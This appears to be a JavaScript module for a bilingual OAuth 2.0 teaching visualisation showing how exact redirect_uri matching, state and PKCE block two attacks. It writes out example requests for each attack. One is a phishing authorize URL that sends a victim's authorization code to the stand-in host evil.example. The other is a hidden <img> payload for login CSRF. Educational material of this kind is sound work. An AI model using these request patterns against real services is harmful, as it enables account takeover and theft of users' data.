// OAuth 2.0 authorization code flow, with three switchable defences and two attacks.
const L = (en, zh) => ({ en, zh });
const M = (from, to, label, note, kind = 'normal', http = '') => ({ from, to, label, note, kind, code: http });

export const ACTORS = [
  { id: 'atk', label: L('Attacker', '攻击者'), sub: 'evil.example', tone: 'red' },
  { id: 'vic', label: L('Alice’s browser', 'Alice 的浏览器'), sub: L('victim', '受害者'), tone: 'green' },
  { id: 'shop', label: L('Shop (client)', '商城（客户端）'), sub: 'shop.example', tone: 'neutral' },
  { id: 'auth', label: L('Login provider', '登录服务商'), sub: 'accounts.example', tone: 'blue' },
];

export const ATTACKS = {
  normal: L('Normal login', '正常登录'),
  redirect: L('Steal the code (redirect_uri)', '偷授权码（redirect_uri）'),
  csrf: L('Log Alice into my account (no state)', '让 Alice 登进我的账号（无 state）'),
};

export const DEFENCES = {
  exact: L('Exact redirect_uri match', 'redirect_uri 精确匹配'),
  state: L('state checked', '校验 state'),
  pkce: L('PKCE', 'PKCE'),
};

const GOOD = 'https://shop.example/callback';
const EVIL = 'https://shop.example.evil.example/callback';

function authorize(redirect, d) {
  return `GET /authorize?response_type=code&client_id=shop\n  &redirect_uri=${redirect}${d.state ? '\n  &state=k3J9xQ' : ''}${d.pkce ? '\n  &code_challenge=E9Melhoa…&code_challenge_method=S256' : ''}\nHost: accounts.example`;
}
function token(code, verifier) {
  return `POST /token\nHost: accounts.example\n\ngrant_type=authorization_code&code=${code}\n&redirect_uri=${GOOD}&client_secret=••••${verifier ? `\n&code_verifier=${verifier}` : ''}`;
}

/** Build the message list for one attack with the chosen defences. */
export function flow(attack, d) {
  const m = [];
  if (attack === 'normal') {
    m.push(M('vic', 'shop', L('Click “Log in with Accounts”', '点击“使用 Accounts 登录”'), L(`The shop makes a random state${d.pkce ? ' and a PKCE verifier' : ''}, keeps it in Alice’s session, and redirects her.`, `商城生成随机的 state${d.pkce ? '和 PKCE verifier' : ''}，存进 Alice 的会话，然后重定向她。`)));
    m.push(M('vic', 'auth', 'GET /authorize', L('Alice’s browser asks the provider for a code for the shop.', 'Alice 的浏览器向服务商为商城申请一个授权码。'), 'normal', authorize(GOOD, d)));
    m.push(M('auth', 'vic', `302 → callback?code=A1ice…`, L('Alice logs in and consents. The provider sends the code to the registered callback.', 'Alice 登录并同意授权。服务商把授权码发到已注册的回调地址。'), 'normal', `HTTP/1.1 302 Found\nLocation: ${GOOD}?code=A1iceC0de${d.state ? '&state=k3J9xQ' : ''}`));
    m.push(M('vic', 'shop', 'GET /callback?code=…', L(d.state ? 'The shop checks that state matches the one in Alice’s session.' : 'The shop receives the code.', d.state ? '商城校验 state 与 Alice 会话里保存的一致。' : '商城收到授权码。'), 'normal'));
    m.push(M('shop', 'auth', 'POST /token', L('The shop swaps the code for a token, server to server.', '商城在服务器之间用授权码换取令牌。'), 'normal', token('A1iceC0de', d.pkce && 'dBjftJeZ4CVP…')));
    m.push(M('auth', 'shop', 'access_token (alice)', L('Code and verifier check out. A token for Alice.', '授权码和 verifier 都校验通过，签发 Alice 的令牌。'), 'secure'));
    m.push(M('shop', 'vic', L('Logged in as Alice', '以 Alice 身份登录'), L('This is the flow working as designed.', '这就是流程按设计正常运行的样子。'), 'secure'));
    return { messages: m, outcome: 'normal' };
  }

  if (attack === 'redirect') {
    m.push(M('atk', 'shop', L('Attacker starts a login', '攻击者发起一次登录'), L(`In their own browser. The shop puts a fresh state${d.pkce ? ' and PKCE verifier' : ''} in the attacker’s session and returns an authorize URL.`, `在攻击者自己的浏览器里。商城把新的 state${d.pkce ? '和 PKCE verifier' : ''}存进攻击者的会话，并返回一个授权 URL。`), 'attack'));
    m.push(M('atk', 'vic', L('Phishing link', '钓鱼链接'), L('The same URL, with one change: redirect_uri now points at a domain the attacker owns.', '还是那个 URL，只改了一处：redirect_uri 指向攻击者拥有的域名。'), 'attack', authorize(EVIL, d)));
    m.push(M('vic', 'auth', 'GET /authorize', L('Alice sees the genuine login page and logs in.', 'Alice 看到的是真正的登录页面，于是登录了。'), 'attack', authorize(EVIL, d)));
    if (d.exact) {
      m.push(M('auth', 'vic', L('400 redirect_uri mismatch', '400 redirect_uri 不匹配'), L('The provider compares redirect_uri with the registered value, character for character. No code is issued.', '服务商把 redirect_uri 和注册值逐字符比较，不签发授权码。'), 'secure'));
      return { messages: m, outcome: 'blocked' };
    }
    m.push(M('auth', 'vic', '302 → evil…?code=A1ice…', L('A prefix check passes "https://shop.example.evil.example", so the code goes there.', '前缀检查放过了 "https://shop.example.evil.example"，授权码被发到那里。'), 'attack', `HTTP/1.1 302 Found\nLocation: ${EVIL}?code=A1iceC0de${d.state ? '&state=k3J9xQ' : ''}`));
    m.push(M('vic', 'atk', L('code delivered', '授权码送达'), L('Alice’s browser follows the redirect. The attacker’s server logs the code.', 'Alice 的浏览器跟随重定向，攻击者的服务器记下了授权码。'), 'attack', `GET /callback?code=A1iceC0de${d.state ? '&state=k3J9xQ' : ''}\nHost: shop.example.evil.example`));
    m.push(M('atk', 'shop', 'GET /callback?code=A1ice…', L(`The attacker replays it in their own browser.${d.state ? ' The state matches the attacker’s own session, so the check passes.' : ''}`, `攻击者在自己的浏览器里重放它。${d.state ? 'state 和攻击者自己的会话一致，所以校验通过。' : ''}`), 'attack'));
    m.push(M('shop', 'auth', 'POST /token', L(d.pkce ? 'The verifier comes from the attacker’s session, and it is the one that matches the challenge in the URL. PKCE passes.' : 'Nothing ties the code to Alice’s browser.', d.pkce ? 'verifier 取自攻击者的会话，恰好与 URL 里的 challenge 匹配，PKCE 校验通过。' : '没有任何东西把授权码和 Alice 的浏览器绑定在一起。'), 'attack', token('A1iceC0de', d.pkce && 'dBjftJeZ4CVP…')));
    m.push(M('auth', 'shop', 'access_token (alice)', L('Valid code, valid client: a token for Alice.', '授权码有效，客户端有效：签发 Alice 的令牌。'), 'attack'));
    m.push(M('shop', 'atk', L('Logged in as Alice', '以 Alice 身份登录'), L(d.state || d.pkce ? 'Account takeover anyway. state and PKCE bind the code to the browser that started the flow, and here that was the attacker. Only exact redirect_uri matching stops this.' : 'Account takeover.', d.state || d.pkce ? '账号照样被接管。state 和 PKCE 把授权码绑定到发起流程的浏览器上，而这里发起流程的正是攻击者。只有 redirect_uri 精确匹配才能挡住这种攻击。' : '账号被接管。'), 'attack'));
    return { messages: m, outcome: 'pwned' };
  }

  // csrf: attacker injects their own code into Alice's browser
  m.push(M('atk', 'auth', L('Attacker logs in as mallory', '攻击者以 mallory 登录'), L('The attacker starts a login for their own account and stops before using the code.', '攻击者为自己的账号发起登录，在使用授权码之前停下。'), 'attack', authorize(GOOD, { state: false, pkce: false })));
  m.push(M('auth', 'atk', '302 → callback?code=Ma11ory…', L('The attacker keeps this code.', '攻击者把这个授权码留着。'), 'attack', `HTTP/1.1 302 Found\nLocation: ${GOOD}?code=Ma11oryC0de`));
  m.push(M('atk', 'vic', L('Hidden <img> on a page', '页面里隐藏的 <img>'), L('Alice visits an innocent-looking page that loads the shop’s callback with the attacker’s code.', 'Alice 访问一个看起来无害的页面，它用攻击者的授权码加载商城的回调地址。'), 'attack', `<img src="${GOOD}?code=Ma11oryC0de">`));
  m.push(M('vic', 'shop', 'GET /callback?code=Ma11ory…', L('Alice never started a login, so her session holds no state and no verifier.', 'Alice 从没发起过登录，所以她的会话里既没有 state 也没有 verifier。'), 'attack'));
  if (d.state) {
    m.push(M('shop', 'shop', L('state missing → reject', '缺少 state → 拒绝'), L('The callback has no state matching Alice’s session, so the shop refuses it.', '回调里没有与 Alice 会话匹配的 state，商城拒绝处理。'), 'secure'));
    return { messages: m, outcome: 'blocked' };
  }
  if (d.pkce) {
    m.push(M('shop', 'shop', L('no verifier → reject', '没有 verifier → 拒绝'), L('No code_verifier in Alice’s session, so the shop cannot redeem the code. PKCE also stops this.', 'Alice 的会话里没有 code_verifier，商城无法兑换授权码。PKCE 同样能挡住这种攻击。'), 'secure'));
    return { messages: m, outcome: 'blocked' };
  }
  m.push(M('shop', 'auth', 'POST /token', L('The shop redeems the attacker’s code.', '商城兑换了攻击者的授权码。'), 'attack', token('Ma11oryC0de')));
  m.push(M('auth', 'shop', 'access_token (mallory)', L('A token for the attacker’s account.', '签发的是攻击者账号的令牌。'), 'attack'));
  m.push(M('shop', 'vic', L('Alice is now logged in as mallory', 'Alice 现在登录的是 mallory 的账号'), L('Anything Alice saves, such as a card or an address, goes into the attacker’s account.', 'Alice 保存的任何东西，比如银行卡、地址，都会存进攻击者的账号。'), 'attack'));
  return { messages: m, outcome: 'pwned' };
}
